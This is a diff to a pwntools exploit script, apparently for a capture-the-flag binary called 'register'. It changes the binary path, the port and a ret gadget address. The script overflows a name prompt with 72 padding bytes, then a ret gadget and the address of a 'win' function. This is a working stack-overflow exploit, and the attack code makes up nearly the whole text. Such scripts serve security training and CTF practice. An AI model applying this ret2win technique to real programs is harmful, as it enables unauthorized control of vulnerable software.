@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 from pwn import *
 
-exe = context.binary = ELF(args.EXE or './register')
+exe = context.binary = ELF(args.EXE or '../pub/register')
 
 host = args.HOST or '127.0.0.1'
-port = int(args.PORT or 8889)
+port = int(args.PORT or 10003)
 
 def start_local(argv=[], *a, **kw):
     '''Execute the target binary locally'''
@@ -29,7 +29,7 @@ io = start()
 
 io.sendlineafter(b"Enter your first name:", b"bob")
 
-ret = 0x0000000000401016
+ret = 0x000000000040101a
 payload = b"A"*72
 payload+= p64(ret)
 payload+= p64(exe.symbols.win)
